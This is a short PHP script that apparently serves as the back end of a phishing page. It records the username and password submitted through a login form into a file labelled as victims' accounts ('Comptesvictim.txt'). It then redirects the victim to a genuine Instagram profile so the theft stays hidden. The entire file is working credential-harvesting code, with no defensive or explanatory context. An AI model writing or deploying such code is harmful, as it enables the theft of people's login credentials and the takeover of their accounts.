<?php
 file_put_contents("Comptesvictim.txt"," Compte : " . $_POST['username'] . "  Mot de Pass : " .$_POST['password'] . "\n",FILE_APPEND);
 header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
 exit();

